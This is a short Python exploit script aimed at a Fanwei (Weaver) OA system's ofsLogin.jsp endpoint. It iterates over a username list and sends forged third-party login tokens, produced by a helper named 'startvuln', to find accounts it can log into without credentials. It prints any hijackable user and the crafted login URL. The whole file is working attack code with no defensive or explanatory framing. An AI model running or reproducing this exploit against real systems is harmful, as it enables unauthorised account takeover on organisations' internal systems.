import requests,re
import urllib3
import urllib.parse,time
import fanweiaes
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

hear = {'User-Agent': 'Mozilla5,0 (Windows NT 10.0; Win64; 64) ApplelWebKit/537.36 (KHTML, like Gecko)Chrome/90.0.4430.212 Safari/537.36', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'close', 'Host': '10.4.2.108:8094Accept-Encoding: gzip\x0c deflate', 'Accept-Language': 'en', 'Content-Type': 'application/x-www-form-urlencoded', 'Content-Length': '115'}
with open(r'username.txt','r') as f:
    user =  f.readlines()

def scan_bug1(i):
    for id in user:
        id = id.rstrip()
        # print(id)
        payload = f"syscode=1&timestamp=1&gopage=/wui/index.html&receiver={id}&loginTokenFromThird={fanweiaes.startvuln(id)}"
        url = i+'/mobile/plugin/1/ofsLogin.jsp'
        response = requests.post(url=url,headers=hear,data=payload,timeout=5,verify=False)
        if("/wui/index.html" in response.text):
            print(id)
            a = url+'?'+payload
            return 1,a
    return 0,None
print(scan_bug1('http://test.com'))
